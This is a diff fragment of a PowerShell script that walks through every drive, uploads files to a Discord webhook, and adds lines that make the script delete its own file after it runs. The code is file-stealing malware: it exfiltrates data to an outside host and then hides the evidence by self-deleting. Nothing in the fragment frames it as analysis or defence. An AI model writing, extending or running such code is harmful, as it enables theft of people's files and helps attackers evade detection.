@@ -51,3 +51,7 @@ foreach ($drive in $drives) {
         Upload-FileToDiscord -filePath $_.FullName -webhookUrl $webhookUrl
     }
 }
+
+# Remove the PowerShell script file after execution
+$scriptPath = $MyInvocation.MyCommand.Definition
+Remove-Item -Path $scriptPath -Force
